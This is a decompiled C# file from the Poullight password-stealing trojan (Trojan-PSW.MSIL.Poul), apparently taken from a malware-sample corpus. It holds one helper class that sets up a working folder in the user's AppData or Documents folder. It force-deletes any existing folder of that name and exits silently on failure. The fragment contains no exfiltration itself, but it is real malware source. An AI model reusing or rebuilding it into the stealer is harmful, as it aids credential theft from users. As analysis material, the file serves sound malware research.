// Decompiled with JetBrains decompiler
// Type: CreateDir
// Assembly: Poullight, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A9555FC6-4E86-4D22-9A29-AD3955B2BC52
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\Trojan-PSW.MSIL.Poul.gen-67cfa95ccaa06c437e04f38c3ef890986c1885c61636b84bf51d16b0d7bf957c.exe

using System;
using System.IO;

internal class CreateDir
{
  public static string create(string dir1, string dir2 = null, string dir3 = null)
  {
    string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + dir1;
    try
    {
      Sqlite.SqliteFile();
      if (Directory.Exists(path))
        Directory.Delete(path, true);
      Directory.CreateDirectory(path);
    }
    catch
    {
      try
      {
        path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + (dir2 == null ? dir1 : dir2);
        if (Directory.Exists(path))
          Directory.Delete(path, true);
        Directory.CreateDirectory(path);
      }
      catch
      {
        try
        {
          path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + (dir3 == null ? dir1 : dir3);
          if (Directory.Exists(path))
            Directory.Delete(path, true);
          Directory.CreateDirectory(path);
        }
        catch
        {
          Environment.Exit(0);
        }
      }
    }
    return path;
  }
}
